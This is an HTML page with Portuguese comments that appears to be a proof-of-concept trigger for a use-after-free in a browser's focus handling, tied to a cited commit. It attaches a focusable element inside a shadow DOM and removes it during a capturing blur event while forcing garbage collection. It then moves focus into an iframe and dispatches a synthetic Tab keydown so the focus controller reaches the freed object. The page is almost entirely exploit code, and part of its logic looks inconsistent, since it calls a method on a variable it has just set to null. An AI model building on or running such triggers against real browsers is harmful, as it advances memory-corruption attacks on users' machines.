<!DOCTYPE html>
<html>
<body>
<div id="host"></div>
<iframe id="helperFrame" srcdoc="<input id='subinput'>"></iframe>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);  
}

// Configuração do Shadow DOM (alvo do commit 7aacc65)
let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable Shadow Victim';
shadowRoot.appendChild(victim);
victim.focus();

// Listener de blur com a sua técnica de remoção cirúrgica e GC pesado
document.addEventListener('blur', (e) => {
    // Simula a adoção ou remoção agressiva que você usou no seu UAF
    if (victim) {
        victim.remove();
        victim = null;
    }
    gc();
}, { capture: true, once: true });

// Aciona a mudança de foco usando os mecanismos combinados do seu PoC
setTimeout(() => {
    // 1. Foca o elemento no iframe para deslocar o contexto
    let iframeInput = helperFrame.contentDocument.getElementById('subinput');
    if (iframeInput) {
        iframeInput.focus();
    }

    // 2. Dispara o evento de teclado sintético (Tab) para forçar o FocusController a rodar o ciclo
    victim.dispatchEvent(new KeyboardEvent('keydown', {
        bubbles: true,
        cancelable: true,
        view: window,
        key: 'Tab',
        code: 'Tab',
        keyCode: 9
    }));
}, 50);
</script>
</body>
</html>
